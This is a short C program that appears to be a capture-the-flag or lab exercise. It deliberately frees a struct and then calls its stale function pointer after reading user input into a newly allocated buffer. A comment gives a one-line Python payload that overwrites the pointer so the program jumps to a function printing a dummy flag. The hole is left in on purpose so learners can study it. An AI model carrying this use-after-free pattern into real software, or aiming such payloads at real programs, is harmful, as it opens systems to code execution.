#include <stdio.h>
#include <stdlib.h>

typedef struct {
    char *b;
    void (*fp)(void);
} something_s;

something_s *s = NULL;

void randfn(void)
{
    puts("this is just a random function call");
}

void prtflg(void)
{
    puts("flag{aiojsoajso}");
}

// works on windows but not on linux...
// python3 -c "import sys; sys.stdout.buffer.write(b'A' * 4 + b'\x75\x14\x40\x00\x00\x00\x00\x00')" | .\test.exe
int main(void)
{
    s = malloc(sizeof(something_s));
    printf("s is located at: %p\n", (void *)s);
    s->b = malloc(16);
    s->fp = randfn;
    s->fp(); 
    free(s->b);
    free(s);
    char *c = malloc(32);
    printf("c is located at: %p\n", (void *)c);
    printf("before, fp is located at: %p\n", (void *)s->fp); 
    printf("give me something: ");
    fgets(c, 32, stdin);
    puts("thank you");
    printf("after, fp is located at: %p\n", (void *)s->fp); 
    s->fp(); 
    return 0;
}
